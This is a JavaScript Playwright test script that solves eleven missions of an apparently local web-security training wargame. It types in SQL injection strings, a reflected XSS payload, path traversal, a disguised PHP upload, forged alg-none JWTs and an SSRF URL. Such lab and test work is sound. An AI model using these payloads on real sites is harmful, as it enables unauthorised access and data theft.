import playwright from '/Users/imhanbyeol/.codex/skills/develop-web-game/scripts/node_modules/playwright/index.js';
import fs from 'node:fs';

const { chromium } = playwright;
const base = 'http://127.0.0.1:18092';
const output = '/tmp/wargame-target-e2e';
fs.rmSync(output, { recursive: true, force: true });
fs.mkdirSync(output, { recursive: true });
const browser = await chromium.launch({ headless: true });
const results = [];

const submit = async (page, selector) => {
  await Promise.all([
    page.waitForNavigation({ waitUntil: 'networkidle' }),
    page.locator(selector).click(),
  ]);
};

const forgeJwt = async (page, role, scope = null) => {
  await page.locator('[data-jwt-decode]').click();
  const headerField = page.locator('[data-jwt-header]');
  const payloadField = page.locator('[data-jwt-payload]');
  const header = JSON.parse(await headerField.inputValue());
  const payload = JSON.parse(await payloadField.inputValue());
  header.alg = 'none';
  payload.role = role;
  if (scope !== null) payload.scope = scope;
  await headerField.fill(JSON.stringify(header, null, 2));
  await payloadField.fill(JSON.stringify(payload, null, 2));
  await page.locator('[data-jwt-encode]').click();
};

const scenarios = {
  'web-v1-01-http': async (page) => {
    await submit(page, '.sale-checker button[type="submit"]');
    const clue = await page.locator('.header-values dt', { hasText: 'X-Lab-Next' }).locator('xpath=following-sibling::dd[1]').textContent();
    await page.locator('[data-request-field="path"]').fill(clue.trim());
    await page.locator('[data-request-field="headers.X-Debug-Mode"]').fill('inspect');
    await submit(page, '.sale-checker button[type="submit"]');
  },
  'web-v1-02-client-trust': async (page) => {
    await page.locator('[data-token-decode]').click();
    await page.locator('[data-token-claim="role"]').fill('reviewer');
    await page.locator('[data-token-encode]').click();
    await submit(page, '.session-card button[type="submit"]');
  },
  'web-v1-03-idor': async (page) => {
    const activity = await page.locator('.nova-activity small').first().textContent();
    const id = activity.match(/#(\d+)/)?.[1];
    if (!id) throw new Error('Nova activity ID missing');
    await page.locator('[data-request-field="query.id"]').fill(id);
    await submit(page, '.nova-url-edit button[type="submit"]');
  },
  'web-v1-04-sqli-login': async (page) => {
    await page.locator('[data-request-field="body.username"]').fill("manager' -- ");
    await page.locator('[data-request-field="body.password"]').fill('not-used');
    await submit(page, '.comet-login button[type="submit"]');
  },
  'web-v1-05-sqli-union': async (page) => {
    await page.locator('[data-request-field="query.q"]').fill("%' UNION SELECT note_title, note_body FROM training_notes -- ");
    await submit(page, '.helios-search button[type="submit"]');
  },
  'web-v1-06-reflected-xss': async (page) => {
    await page.locator('[data-request-field="query.q"]').fill('<img src=x onerror="completeLab()">');
    await submit(page, '.prism-search button[type="submit"]');
    await page.waitForTimeout(100);
  },
  'web-v1-07-path-traversal': async (page) => {
    const content = await page.locator('.text-document pre').textContent();
    const file = content.match(/\.\.\/private\/([^\s]+)/)?.[0];
    if (!file) throw new Error('Atlas private path missing');
    await page.locator('[data-request-field="query.file"]').fill(file);
    await submit(page, '.file-pathbar button[type="submit"]');
  },
  'web-v1-08-upload-validation': async (page) => {
    await page.locator('[data-request-field="files.file.name"]').fill('avatar.php');
    await page.locator('[data-request-field="files.file.type"]').fill('image/png');
    await page.locator('[data-request-field="files.file.content"]').fill('LAB_UPLOAD_MARKER\ntraining-only');
    await submit(page, '.avatar-upload button[type="submit"]');
  },
  'web-v1-09-jwt-validation': async (page) => {
    await forgeJwt(page, 'admin');
    await submit(page, '.approval-panel button[type="submit"]');
  },
  'web-v1-10-ssrf': async (page) => {
    await page.locator('[data-request-field="body.url"]').fill('http://metadata.training/latest/lab-proof');
    await submit(page, '.lumen-tools button[type="submit"]');
  },
  'web-v1-11-operation-nightfall': async (page) => {
    const id = (await page.locator('.audit-callout b').textContent()).trim();
    await page.locator('[data-request-field="query.id"]').fill(id);
    await submit(page, '.night-form button[type="submit"]');
    const configPath = (await page.locator('.case-data code').textContent()).trim();
    await page.locator('[data-request-field="query.file"]').fill(configPath);
    await submit(page, '.night-form button[type="submit"]');
    await forgeJwt(page, 'admin', 'vault:open');
    await submit(page, '.night-form button[type="submit"]');
    await submit(page, '.night-form button[type="submit"]');
  },
};

for (const [id, scenario] of Object.entries(scenarios)) {
  if (process.env.MISSION && process.env.MISSION !== id) continue;
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await context.newPage();
  await page.addInitScript(() => {
    const originalRequestSubmit = HTMLFormElement.prototype.requestSubmit;
    HTMLFormElement.prototype.requestSubmit = function (...args) {
      if (this.matches?.('[data-completion-handoff]')) {
        this.dataset.browserCheckIntercepted = '1';
        return;
      }
      return originalRequestSubmit.apply(this, args);
    };
  });
  const errors = [];
  page.on('console', message => { if (message.type() === 'error') errors.push(message.text()); });
  page.on('pageerror', error => errors.push(String(error)));
  let scenarioError = null;
  try {
    await page.goto(`${base}/__codex_target_fixture.php?mission=${id}`, { waitUntil: 'networkidle' });
    await scenario(page);
  } catch (error) {
    scenarioError = String(error);
  }
  const state = await page.evaluate(() => JSON.parse(window.render_game_to_text()));
  const completionVisible = await page.locator('.target-completion').isVisible().catch(() => false);
  await page.screenshot({ path: `${output}/${id}.png`, fullPage: false });
  results.push({ id, state, completionVisible, errors, scenarioError });
  await context.close();
}

await browser.close();
fs.writeFileSync(`${output}/results.json`, JSON.stringify(results, null, 2));
if (results.some(result => result.scenarioError || result.errors.length || !result.state.completed || !result.completionVisible)) process.exitCode = 1;
